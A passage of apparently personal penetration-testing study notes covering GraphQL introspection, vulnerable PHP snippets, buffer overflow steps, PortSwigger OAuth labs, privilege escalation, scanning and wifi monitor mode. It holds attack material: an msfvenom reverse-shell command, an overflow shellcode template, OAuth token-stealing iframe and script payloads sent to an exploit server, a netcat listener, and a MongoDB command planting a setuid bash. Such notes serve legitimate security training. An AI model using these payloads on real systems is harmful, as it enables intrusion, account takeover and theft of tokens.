</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>ofType</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>kind</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>ofType</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>kind</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>ofType</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>kind</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>}</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>}</span><span class=w>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>query</span><span class=w> </span><span class=n>IntrospectionQuery</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>__schema</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>queryType</span><span class=w> </span><span class=err>{</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mutationType</span><span class=w> </span><span class=err>{</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>subscriptionType</span><span class=w> </span><span class=err>{</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>types</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=p>...</span><span class=n>FullType</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>directives</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>description</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>args</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>...</span><span class=n>InputValue</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>onOperation</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>onFragment</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>onField</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>fragment</span><span class=w> </span><span class=n>FullType</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=n>__Type</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>kind</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>description</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>fields</span><span class=p>(</span><span class=n>includeDeprecated</span><span class=p>:</span><span class=w> </span><span class=k>true</span><span class=p>)</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>description</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>args</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=p>...</span><span class=n>InputValue</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>type</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=p>...</span><span class=n>TypeRef</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>isDeprecated</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>deprecationReason</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>inputFields</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>...</span><span class=n>InputValue</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>interfaces</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>...</span><span class=n>TypeRef</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>enumValues</span><span class=p>(</span><span class=n>includeDeprecated</span><span class=p>:</span><span class=w> </span><span class=k>true</span><span class=p>)</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>description</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>isDeprecated</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>deprecationReason</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>possibleTypes</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>...</span><span class=n>TypeRef</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>fragment</span><span class=w> </span><span class=n>InputValue</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=n>__InputValue</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>description</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>type</span><span class=w> </span><span class=err>{</span><span class=w> </span><span class=p>...</span><span class=n>TypeRef</span><span class=w> </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>defaultValue</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>fragment</span><span class=w> </span><span class=n>TypeRef</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=n>__Type</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>kind</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>ofType</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>kind</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>ofType</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>kind</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>ofType</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>kind</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>}</span><span class=w>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>query</span><span class=w> </span><span class=n>MyQuery</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=n>__schema</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>types</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>fields</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>       </span><span class=n>name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=err>}</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>}</span><span class=w>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=w>  </span><span class=n>query</span><span class=w> </span><span class=n>Query</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>ptlabkeys</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>value</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>}</span><span class=w>
</span></span></span></code></pre></div><h2 id=source-code-reviews>Source Code Reviews<a hidden class=anchor aria-hidden=true href=#source-code-reviews>#</a></h2><p><a href=https://z-r0crypt.github.io/blog/2020/01/22/oswe/awae-preparation/>GoldMine</a></p><h3 id=php-2>PHP<a hidden class=anchor aria-hidden=true href=#php-2>#</a></h3><ul><li>Directory Traversal</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>list_files_for_user</span><span class=p>(</span><span class=nv>$username</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	  <span class=nv>$base</span> <span class=o>=</span> <span class=s2>&#34;files/&#34;</span><span class=o>.</span><span class=nv>$username</span><span class=p>;</span>  <span class=c1>### Vulnerability as user controlled input is getting concatenated. user input can be `../../../etc/passwd?`
</span></span></span><span class=line><span class=cl><span class=c1></span>	  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$base</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	    <span class=nx>mkdir</span><span class=p>(</span><span class=nv>$base</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	  <span class=p>}</span>
</span></span><span class=line><span class=cl>	  <span class=k>return</span> <span class=nx>array_diff</span><span class=p>(</span><span class=nx>scandir</span><span class=p>(</span><span class=nv>$base</span><span class=p>),</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;..&#39;</span><span class=p>,</span> <span class=s1>&#39;.&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span></code></pre></div><ul><li>File Upload Bypass</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>	  <span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>addfile</span><span class=p>(</span><span class=nv>$user</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	  <span class=nv>$file</span> <span class=o>=</span> <span class=s2>&#34;files/&#34;</span><span class=o>.</span><span class=nx>basename</span><span class=p>(</span><span class=nv>$user</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;/&#34;</span><span class=o>.</span><span class=nx>basename</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>	  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/\.pdf/&#34;</span><span class=p>,</span> <span class=nv>$file</span><span class=p>))</span> <span class=p>{</span> <span class=c1>#Does not stop the user from uploading shell.pdf.php need to add $ to properly regex.
</span></span></span><span class=line><span class=cl><span class=c1></span>	    <span class=k>return</span>  <span class=s2>&#34;Only PDF are allowed&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	  <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=o>!</span><span class=nx>move_uploaded_file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;tmp_name&#34;</span><span class=p>],</span> <span class=nv>$file</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	    <span class=k>return</span> <span class=s2>&#34;Sorry, there was an error uploading your file.&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	  <span class=p>}</span>
</span></span><span class=line><span class=cl>	  <span class=k>return</span> <span class=k>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span></code></pre></div><h3 id=aspnet>ASP.NET<a hidden class=anchor aria-hidden=true href=#aspnet>#</a></h3><ul><li>Views = contains html pages <strong><em>.cshtml extension</em></strong> = c#html, gets list of data from controller</li><li>Model = data related = classes, sql statements, gives controller with list of objects</li></ul><h2 id=google-dorks>Google Dorks<a hidden class=anchor aria-hidden=true href=#google-dorks>#</a></h2><ul><li>site: include only results on a given hostname.</li><li>intitle: filtest according to the title of a page.</li><li>inurl: filters according to url of a resource.</li><li>filetype: filters according to file extensions.</li><li><code>-</code> filters out keywords</li></ul><h2 id=buffer-overflow-bof>Buffer Overflow BOF<a hidden class=anchor aria-hidden=true href=#buffer-overflow-bof>#</a></h2><ul><li>Main goal is to overflow buffer space to overwrite EIP(Extended Instruction Pointer)</li></ul><p>Steps in BOF</p><ul><li>Spiking: Finding vulnerable part of the program</li><li>Fuzzing: Sending characters to the vulnerable part of the program to break it</li><li>Finding Offset: This is where the program crashes</li><li>Overwrite the EIP using the Offset found</li><li>Find the right module</li><li>Shellcode</li></ul><p>Tools</p><ul><li>Immunity Debugger</li><li>generic_send_tcp</li></ul><h3 id=spiking>Spiking<a hidden class=anchor aria-hidden=true href=#spiking>#</a></h3><ul><li>readelf -s <code>program</code></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl>  <span class=n>s_readline</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>s_string</span><span class=p>(</span><span class=s>&#34;TRUN &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>s_string_variable</span><span class=p>(</span><span class=s>&#34;0&#34;</span><span class=p>);</span>
</span></span></code></pre></div><h3 id=metasploit-module-for-pattern>Metasploit module for pattern<a hidden class=anchor aria-hidden=true href=#metasploit-module-for-pattern>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pattern_create.rb -l <span class=s2>&#34;bytes&#34;</span>
</span></span><span class=line><span class=cl>pattern_offset -l <span class=s2>&#34;bytes&#34;</span> -q <span class=s2>&#34;what data is in EIP HEX&#34;</span>
</span></span></code></pre></div><p><a href=https://github.com/cytopia/badchars>Bad Character Checker</a></p><h3 id=finding-modules>Finding Modules<a hidden class=anchor aria-hidden=true href=#finding-modules>#</a></h3><ul><li><a href=https://github.com/corelan/mona>Finding Modules - Mona</a></li><li>nasm_shell.rb</li><li><code>msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT EXITFUNC=thread -f c -a x86 -b "badcharacters"</code></li></ul><h3 id=shell-example>Shell example<a hidden class=anchor aria-hidden=true href=#shell-example>#</a></h3><ul><li><code>shellcode= "A" * 2002 + "\xaf\x11\x50\x62 - this address is from nasm_shell.rb JMP ESP" + "\x90" * 32 + overflowfrommsfvenom</code></li></ul><h2 id=oauth>OAuth<a hidden class=anchor aria-hidden=true href=#oauth>#</a></h2><p><a href=https://0xn3va.gitbook.io/cheat-sheets/web-application/oauth-2.0-vulnerabilities>Cheatsheet</a></p><p>In OAuth 2.0, the client requests access to resources controlled by the resource owner and hosted by the resource server and is issued a different set of credentials than those of the resource owner. Instead of using the resource owner&rsquo;s credentials to access protected resources, the client obtains an access token.</p><ul><li>Resource Owner = ME</li><li>Resource Server = API I want to access</li><li>Client = Web server that wants to access the API</li><li>Auth server = OID server.</li></ul><h3 id=oauth-20>OAuth 2.0<a hidden class=anchor aria-hidden=true href=#oauth-20>#</a></h3><ul><li>Oauth that uses implicit grant, this one does not request for a code but goes directly to ask for a token.</li><li>Hijack account using redirect_uri<ul><li>Intercept the request that asks for a code</li><li>change the redirect_uri to your server.</li><li>send payload to victim.</li><li>If the victim loads the payload your server will get a valid code to continue the flow and get a valid token of the victim</li></ul></li></ul><p>EX. payload</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;https://oauth-ac361fb21ebd0c90c081232a02a0000f.web-security-academy.net/auth?client_id=onpkl0n5tyylthtolkxnr&amp;redirect_uri=https://exploit-ac961f381edb0cdcc03b232201d80044.web-security-academy.net/exploit&amp;response_type=code&amp;scope=openid%20profile%20email&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span> 
</span></span></code></pre></div><ul><li>Steal token via open redirect example from portswigger.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nb>document</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>hash</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>window</span><span class=p>.</span><span class=nx>location</span> <span class=o>=</span> <span class=s1>&#39;https://oauth-ac5c1fa71f183ad6c01d63bf029c0093.web-security-academy.net/auth?client_id=nl739ogh6wfprguffv3pu&amp;redirect_uri=https://ac5f1fde1fef3aeec00463d7000f0082.web-security-academy.net/oauth-callback/../../../../post/next?path=https://exploit-ac5f1ff41fce3a1ec0366355011f0094.web-security-academy.net/exploit&amp;response_type=token&amp;nonce=-233235662&amp;scope=openid%20profile%20email&#39;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>window</span><span class=p>.</span><span class=nx>location</span> <span class=o>=</span> <span class=s1>&#39;/?&#39;</span><span class=o>+</span><span class=nb>document</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>hash</span><span class=p>.</span><span class=nx>substr</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div><ul><li>Steal token via comments example from portswigger.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;https://oauth-ac5b1f091ebc87a7c0231e43020600b9.web-security-academy.net/auth?client_id=flf29axxxdwj96jjj8qi0&amp;redirect_uri=https://ac441fd31e7c8793c0611e60007e0029.web-security-academy.net/oauth-callback/../post/comment/comment-form&amp;response_type=token&amp;nonce=-1552239120&amp;scope=openid%20profile%20email&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nb>window</span><span class=p>.</span><span class=nx>addEventListener</span><span class=p>(</span><span class=s1>&#39;message&#39;</span><span class=p>,</span> <span class=kd>function</span><span class=p>(</span><span class=nx>e</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;/&#34;</span> <span class=o>+</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>e</span><span class=p>.</span><span class=nx>data</span><span class=p>.</span><span class=nx>data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span> <span class=kc>false</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span> 
</span></span></code></pre></div><h2 id=business-logic>Business Logic<a hidden class=anchor aria-hidden=true href=#business-logic>#</a></h2><ul><li>Try setting values to negative then add positive value = free stuff?</li><li>Try reaching max int value 2,147,483,647</li><li>Check registrations for example email characters limited to 255 <a href=https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input>PortSwigger Lab</a></li><li>does change email function send confirmation email</li><li>delete parameters? example in forgot password function delete current password?</li><li>coupon codes? tried sending same code via repeater. alternate two codes.</li></ul><h2 id=better-pty>Better PTY?<a hidden class=anchor aria-hidden=true href=#better-pty>#</a></h2><ul><li><code>stty raw -echo</code> always fails for me instead use <code>rlwrap -car nc -lvnp 9001</code> then use the usual <code>python3 -c 'import pty;pty.spawn("/bin/bash");'</code><ul><li>Now you have clear autocomplete and everything!</li></ul></li></ul><h2 id=privesc-stuff>Privesc Stuff<a hidden class=anchor aria-hidden=true href=#privesc-stuff>#</a></h2><h3 id=linux>Linux<a hidden class=anchor aria-hidden=true href=#linux>#</a></h3><ul><li>linux exploit suggester.sh</li><li>Sudo rights on a file?<ul><li>Do you own the file? edit.</li><li>hijack variable <strong><em>Path variable Vulnerability</em></strong></li></ul></li><li>Symlink? Has write permission to something linked to another file? change symlink with <code>ln -fns /tmp/newlink /var/www/html/itemtolink</code></li></ul><h2 id=dns>DNS<a hidden class=anchor aria-hidden=true href=#dns>#</a></h2><p>Port 53 Open</p><ul><li>Nslookup<ul><li>SERVER <code>&lt;IP></code><ul><li>Search for <code>127.0.0.1</code> and <code>&lt;IP></code></li></ul></li></ul></li><li>Zone Transfer<ul><li><code>dig axfr@&lt;ip> &lt;hostname></code></li></ul></li></ul><h2 id=phpinfo>PHPINFO()<a hidden class=anchor aria-hidden=true href=#phpinfo>#</a></h2><p><a href=https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf>Insomnia #1 &lt;3</a></p><ul><li>Check for <code>file_uploads = on</code> in phpinfo > meaning any php request will accept uploaded files</li></ul><h2 id=mongodb-1>MongoDB<a hidden class=anchor aria-hidden=true href=#mongodb-1>#</a></h2><ul><li>likes everything in json</li><li><code>mongo &lt;dbs> -u &lt;user> -p</code></li><li><code>db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/tom; /bin/chown tom:admin /tmp/tom; chmod g+s /tmp/tom; chmod u+s /tmp/tom"});</code></li></ul><h2 id=thick-client-testing>Thick Client Testing<a hidden class=anchor aria-hidden=true href=#thick-client-testing>#</a></h2><ul><li>Nmap box before installing target app then nmap again after</li><li>install <a href=https://github.com/microsoft/AttackSurfaceAnalyzer>Microsoft Attack Surface Analyzer</a> run before installing the target app then run again after</li><li>Sysinternals</li><li>DLL Hijacking <a href=https://hijacklibs.net/>Hijacklib</a></li></ul><h2 id=fast-as-ffff-scan>fast as ffff scan<a hidden class=anchor aria-hidden=true href=#fast-as-ffff-scan>#</a></h2><ul><li><code>sudo masscan 192.168.141.90 -p0-65535 --rate 1000 -e tun0</code></li><li><code>masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0</code> //might miss something</li><li><code>sudo nmap --min-rate 4500 --max-rtt-timeout 1500ms 192.168.141.90 -p-</code></li></ul><h2 id=wifi-pentesting>Wifi Pentesting<a hidden class=anchor aria-hidden=true href=#wifi-pentesting>#</a></h2><ul><li><code>sudo airmon-ng</code> shows our device&rsquo;s driver.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>kali@kali:~$ sudo airmon-ng
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PHY     Interface       Driver          Chipset
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>phy0    wlan0           ath9k_htc       Qualcomm Atheros Communications AR9271 802.11n
</span></span></code></pre></div><ul><li><p><code>iw</code> new command</p></li><li><p><code>sudo iw dev wlan0 scan | egrep "DS Parameter set|SSID:</code> get the channel</p></li><li><p><code>sudo iw dev wlan0 interface add wlan0mon type monitor</code> use wlan0 to setup wlan0mon in monitor mode</p></li><li><p><code>sudo ip link set wlan0mon up</code> bring wlan0mon up</p></li><li><p><code>sudo iw dev wlan0mon info</code> show wlan0mon info</p></li><li><p><code>sudo iw dev wlan0mon interface del</code> remove</p></li><li><p>Use the following script so wireshark can scan all channels. Wireshark doesnt channel hop. or you can just use <code>Airodump-ng</code> :P</p></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=k>for</span> channel in <span class=m>1</span> <span class=m>6</span> <span class=m>11</span> <span class=m>2</span> <span class=m>7</span> <span class=m>10</span> <span class=m>3</span> <span class=m>8</span> <span class=m>4</span> <span class=m>9</span> <span class=m>5</span>
</span></span><span class=line><span class=cl><span class=k>do</span>
</span></span><span class=line><span class=cl>  iw dev wlan0mon <span class=nb>set</span> channel <span class=si>${</span><span class=nv>channel</span><span class=si>}</span>
</span></span><span class=line><span class=cl>  sleep <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span></code></pre></div><ul><li><code>sudo airmon-ng check &lt;kill></code> checks for processes that might interfere with aircrack suite, adding kill will gracefully kill the processes identified.</li></ul><h3 id=airmon-ng>Airmon-ng<a hidden class=anchor aria-hidden=true href=#airmon-ng>#</a></h3><p>Used to setup monitor mode</p><ul><li><code>sudo airmon-ng start &lt;wlan0></code> will result to wlan0mon</li><li><code>sudo iw dev wlan0mon info</code></li><li><code>sudo airmon-ng stop wlan0mon</code></li></ul><h3 id=airodump-ng>Airodump-ng<a hidden class=anchor aria-hidden=true href=#airodump-ng>#</a></h3><p>Used to capture raw 802.11 frames, suitable for collecting WEB IVs or WPA/WPA2 handshakes which will be used with Aircrack-ng</p><ul><li><code>-w prefix</code> Saves the capture dump to the specified filename</li><li><code>--bssid BSSID</code> Filters Airodump-ng to only capture the specified BSSID</li><li><code>-c channel(s)</code> Forces Airodump-ng to only capture the specified channel(s)</li></ul><p>Sniffing with Airodump-ng</p><ul><li><code>sudo airodump-ng wlan0mon -c 2</code></li></ul><p>The top portion provides information about detected APs along with the encryption in use, network names, etc.
The lower portion provides information about stations sending frames and the associated AP.
